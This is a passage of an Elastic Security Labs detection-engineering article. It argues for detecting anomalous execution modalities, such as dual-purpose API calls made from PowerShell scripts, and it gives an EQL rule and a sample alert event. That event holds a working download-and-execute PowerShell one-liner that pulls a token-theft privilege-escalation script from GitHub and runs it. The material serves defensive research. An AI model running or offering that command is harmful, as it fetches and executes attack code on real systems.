<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Misbehaving Modalities: Detecting Tools, Not Techniques — Elastic Security Labs</title><meta name="description" content="We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."/><meta property="og:title" content="Misbehaving Modalities: Detecting Tools, Not Techniques — Elastic Security Labs"/><meta property="og:description" content="We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/misbehaving-modalities/modalities.png?5d18b4dfa60324e1c3fe540f3fc23d48"/><meta property="og:image:alt" content="We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/misbehaving-modalities"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Misbehaving Modalities: Detecting Tools, Not Techniques — Elastic Security Labs"/><meta name="twitter:description" content="We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/misbehaving-modalities/modalities.png?5d18b4dfa60324e1c3fe540f3fc23d48"/><meta name="twitter:image:alt" content="We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."/><link rel="canonical" href="https://www.elastic.co/security-labs/misbehaving-modalities"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-552c09522cb0544e.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/jyh7A-n9tjhpKhG9IjI3c/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/jyh7A-n9tjhpKhG9IjI3c/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/misbehaving-modalities"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/misbehaving-modalities"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-05-15T00:00:00.000Z">15 May 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/john-uhlmann">John Uhlmann</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Misbehaving Modalities: Detecting Tools, Not&nbsp;Techniques</span></h1><p class="text-zinc-200 text-base md:text-xl">We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>14 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/security-research">Security research</a>, </span><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/detection-science">Detection science</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Misbehaving Modalities: Detecting Tools, Not Techniques" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fmisbehaving-modalities%2Fmodalities.png&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="what-is-execution-modality" class="absolute -top-32"></span><strong>What is Execution Modality?</strong></h2>
<p><a href="https://medium.com/@jaredcatkinson">Jared Atkinson</a>, Chief Strategist at SpecterOps and prolific writer on security strategy, recently introduced the very useful concept of <a href="https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739">Execution Modality</a> to help us reason about malware techniques, and how to robustly detect them. In short, Execution Modality describes <em>how</em> a malicious behaviour is executed, rather than simply defining <em>what</em> the behaviour does.</p>
<p>For example, the behaviour of interest might be <a href="https://attack.mitre.org/techniques/T1543/003/">Windows service creation</a>, and the modality might be either a system utility (such as `sc.exe`), a PowerShell script, or shellcode that uses indirect syscalls to directly write to the service configuration in the Windows Registry.</p>
<p>Atkinson outlined that if your goal is to detect a specific technique, you want to ensure that your collection is as close as possible to the operating system’s source of truth and eliminate any modality assumptions.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="case-study-service-creation-modalities" class="absolute -top-32"></span><strong>Case Study: service creation modalities</strong></h2>
<p></p>
<p>In the typical Service creation scenario within the Windows OS, an installer calls <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sc.exe create</code></a> which makes an <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/6a8ca926-9477-4dd4-b766-692fab07227e"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">RCreateService</code></a> RPC call to an endpoint in the <a href="https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager">Service Control Manager</a> (SCM, aka <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">services.exe</code>) which then makes syscalls to the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-configuration-manager">kernel-mode configuration manager</a> to update the <a href="https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services">database of installed services</a> in the registry.  This is later flushed to disk and restored from disk on boot.</p>
<p>This means that the source of truth for a running system <a href="https://abstractionmaps.com/maps/t1050/">is the registry</a> (though hives are flushed to disk and can be tampered with offline).</p>
<p>In a threat hunting scenario, we could easily detect anomalous <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sc.exe</code> command lines - but a different tool might make Service Control RPC calls directly.</p>
<p>If we were processing our threat data stringently, we could also detect anomalous Service Control RPC calls, but a different tool might make syscalls (in)directly or use another service, such as the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/ec095de8-b4fe-48fb-8114-dea65b4d710e">Remote Registry</a>, to update the service database indirectly.</p>
<p>In other words, some of these execution modalities bypass traditional telemetry such as <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4697">Windows event logs</a>.</p>
<p>So how do we monitor changes to the configuration manager?  We can’t robustly monitor syscalls directly due to <a href="https://en.wikipedia.org/wiki/Kernel_Patch_Protection">Kernel Patch Protection</a>, but Microsoft has provided <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/filtering-registry-calls">configuration manager callbacks</a> as an alternative. This is where Elastic has <a href="https://github.com/tsale/EDR-Telemetry/pull/58#issuecomment-2043958734">focused our service creation detection</a> efforts - as close to the operating system’s source of truth as possible.</p>
<p>The trade-off for this low-level visibility, however, is a potential reduction in context. For example, due to Windows architectural decisions, security vendors do not know which RPC client is requesting the creation of a registry key in the services database. Microsoft only supports querying RPC client details from a user-mode RPC service.</p>
<p>Starting with Windows 10 21H1, Microsoft began including <a href="https://github.com/jdu2600/Windows10EtwEvents/commit/5444e040d65ed2807fcf9ac69ce32131338dc370#diff-b88b65ff9fd39a51c51c594ee3787ea6907e780d4282ae9a7517c04074e2c2b7">RPC client details in the service creation event log</a>. This event, while less robust, sometimes provides additional context that might assist in determining the source of an anomalous behaviour.</p>
<p>Due to their history of abuse, some modalities have been extended with extra logging - one important example is PowerShell.  This allows certain techniques to be detected with high precision - but <em>only</em> when executed within PowerShell. It is important not to conflate having detection coverage of a technique in PowerShell with coverage of that technique in general. This nuance is important when estimating <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> coverage.  As red teams routinely demonstrate, having 100% technique coverage - but only for PowerShell - is close to 0% real-world coverage.</p>
<p><a href="https://ctid.mitre.org/projects/summiting-the-pyramid/">Summiting the Pyramid</a> (STP) is a related analytic scoring methodology from MITRE. It makes a similar conclusion about the fragility of <a href="https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/service_registry_permissions_weakness_check/">PowerShell scriptblock-based detections</a> and assigns such rules a low robustness score.</p>
<p>High-level telemetry sources, such as Process Creation logging and PowerShell logging, are extremely brittle at detecting most techniques as they cover very few modalities. At best, they assist in detecting the most egregious Living off the Land (LotL) abuses.</p>
<p>Atkinson made the following astute observation in the <a href="https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739">example</a> used to motivate the discussion:</p>
<p><em>An important point is that our higher-order objective in detection is behavior-based, not modality-based. Therefore, we should be interested in detecting Session Enumeration (behavior-focused), not Session Enumeration in PowerShell (modality-focused).</em></p>
<p>Sometimes that is only half of the story though.  Sometimes detecting that the tool itself is out of context is more efficient than detecting the technique. Sometimes the execution modality itself is anomalous.</p>
<p>An alternative to detecting a known technique is to detect a misbehaving modality.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="call-stacks-divulge-modality" class="absolute -top-32"></span><strong>Call stacks divulge Modality</strong></h2>
<p>One of Elastic’s strengths is the inclusion of call stacks in the majority of our events. This level of call provenance detail greatly assists in determining whether a given activity is malicious or benign.  Call stack summaries are often sufficient to divulge the execution modality - the runtimes for PowerShell, .NET, RPC, WMI, VBA, Lua, Python, and Java all leave traces in the call stack.</p>
<p>Some of our <a href="https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks">first call stack-based rules</a> were for Office VBA macros (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vbe7.dll</code>) spawning child processes or dropping files, and for unbacked executable memory loading the .NET runtime.  In both of these examples, the technique itself was largely benign; it was the modality of the behaviour that was predominantly anomalous.</p>
<p>So can we flip the typical behaviour-focused detection approach to a modality-focused one?  For example, can we detect solely on the use of <strong>any</strong> dual-purpose API call originating from PowerShell?</p>
<p>Using call stacks, Elastic is able to differentiate between the API calls that originate from PowerShell scripts and those that come from the PowerShell or .NET runtimes.</p>
<p>Using Threat-Intelligence ETW as an approximation for a dual-purpose API, our rule for “Suspicious API Call from a PowerShell Script” was quite effective.</p>
<pre><code>api where
event.provider == &quot;Microsoft-Windows-Threat-Intelligence&quot; and
process.name in~ (&quot;powershell.exe&quot;, &quot;pwsh.exe&quot;, &quot;powershell_ise.exe&quot;) and

/* PowerShell Script JIT - and incidental .NET assemblies */
process.thread.Ext.call_stack_final_user_module.name == &quot;Unbacked&quot; and
process.thread.Ext.call_stack_final_user_module.protection_provenance in (&quot;clr.dll&quot;, &quot;mscorwks.dll&quot;, &quot;coreclr.dll&quot;) and

/* filesystem enumeration activity */
not process.Ext.api.summary like &quot;IoCreateDevice( \\FileSystem\\*, (null) )&quot; and

/* exclude nop operations */
not (process.Ext.api.name == &quot;VirtualProtect&quot; and process.Ext.api.parameters.protection == &quot;RWX&quot; and process.Ext.api.parameters.protection_old == &quot;RWX&quot;) and

/* Citrix GPO Scripts */
not (process.parent.executable : &quot;C:\\Windows\\System32\\gpscript.exe&quot; and
  process.Ext.api.summary in (&quot;VirtualProtect( Unbacked, 0x10, RWX, RW- )&quot;, &quot;WriteProcessMemory( Self, Unbacked, 0x10 )&quot;, &quot;WriteProcessMemory( Self, Data, 0x10 )&quot;)) and

/* cybersecurity tools */
not (process.Ext.api.name == &quot;VirtualAlloc&quot; and process.parent.executable : (&quot;C:\\Program Files (x86)\\CyberCNSAgent\\cybercnsagent.exe&quot;, &quot;C:\\Program Files\\Velociraptor\\Velociraptor.exe&quot;)) and

/* module listing */
not (process.Ext.api.name in (&quot;EnumProcessModules&quot;, &quot;GetModuleInformation&quot;, &quot;K32GetModuleBaseNameW&quot;, &quot;K32GetModuleFileNameExW&quot;) and
  process.parent.executable : (&quot;*\\Lenovo\\*\\BGHelper.exe&quot;, &quot;*\\Octopus\\*\\Calamari.exe&quot;)) and

/* WPM triggers multiple times at process creation */
not (process.Ext.api.name == &quot;WriteProcessMemory&quot; and
     process.Ext.api.metadata.target_address_name in (&quot;PEB&quot;, &quot;PEB32&quot;, &quot;ProcessStartupInfo&quot;, &quot;Data&quot;) and
     _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like (&quot;?:\\windows\\*\\kernelbase.dll!CreateProcess*&quot;, &quot;Unknown&quot;)))</code></pre>
<p>Even though we don’t need to use the brittle PowerShell AMSI logging for detection, we can still provide this detail in the event as context as it assists with triage.  This modality-based approach even detects common PowerShell defence evasion tradecraft such as:</p>
<ul>
<li>ntdll unhooking</li>
<li>AMSI patching</li>
<li>user-mode ETW patching</li>
</ul>
<pre><code>{
 &quot;event&quot;: {
  &quot;provider&quot;: &quot;Microsoft-Windows-Threat-Intelligence&quot;,
  &quot;created&quot;: &quot;2025-01-29T18:27:09.4386902Z&quot;,
  &quot;kind&quot;: &quot;event&quot;,
  &quot;category&quot;: &quot;api&quot;,
  &quot;type&quot;: &quot;change&quot;,
  &quot;outcome&quot;: &quot;unknown&quot;
 },
 &quot;message&quot;: &quot;Endpoint API event - VirtualProtect&quot;,
 &quot;process&quot;: {
  &quot;parent&quot;: {
   &quot;executable&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;
  },
  &quot;name&quot;: &quot;powershell.exe&quot;,
  &quot;executable&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
  &quot;code_signature&quot;: {
   &quot;trusted&quot;: true,
   &quot;subject_name&quot;: &quot;Microsoft Windows&quot;,
   &quot;exists&quot;: true,
   &quot;status&quot;: &quot;trusted&quot;
  },
  &quot;command_line&quot;: &quot;\&quot;powershell.exe\&quot; &amp; {iex(new-object net.webclient).downloadstring(&#x27;https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1&#x27;);Get-WinLogonTokenSystem}&quot;,
  &quot;pid&quot;: 21908,
  &quot;Ext&quot;: {
   &quot;api&quot;: {
    &quot;summary&quot;: &quot;VirtualProtect( kernel32.dll!FatalExit, 0x21, RWX, R-X )&quot;,
    &quot;metadata&quot;: {
     &quot;target_address_path&quot;: &quot;c:\\windows\\system32\\kernel32.dll&quot;,
     &quot;amsi_logs&quot;: [
      {
       &quot;entries&quot;: [
        &quot;&amp; {iex(new-object net.webclient).downloadstring(&#x27;https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1&#x27;);Get-WinLogonTokenSystem}&quot;,
        &quot;{iex(new-object net.webclient).downloadstring(&#x27;https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1&#x27;);Get-WinLogonTokenSystem}&quot;,
        &quot;function Get-WinLogonTokenSystem\n{\nfunction _10001011000101101\n{\n  [CmdletBinding()]\n  Param(\n [Parameter(Position = 0, Mandatory = $true)]\n [ValidateNotNullOrEmpty()]\n [Byte[]]\n ${_00110111011010011},\n ...&lt;truncated&gt;&quot;,
        &quot;{[Char] $_}&quot;,
        &quot;{\n [CmdletBinding()]\n Param(\n   [Parameter(Position = 0, Mandatory = $true)]\n   [Byte[]]\n   ${_00110111011010011},\n   [Parameter(Position = 1, Mandatory = $true)]\n   [String]\n   ${_10100110010101100},\n ...&lt;truncated&gt;&quot;,
        &quot;{ $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\\\&#x27;)[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#x27;UwB5AHMAdABlAG0ALgBkAGwAbAA=&#x27;)))) }&quot;
       ],
       &quot;type&quot;: &quot;PowerShell&quot;
      }
     ],
     &quot;target_address_name&quot;: &quot;kernel32.dll!FatalExit&quot;,
     &quot;amsi_filenames&quot;: [
      &quot;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1&quot;,
      &quot;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1&quot;
     ]
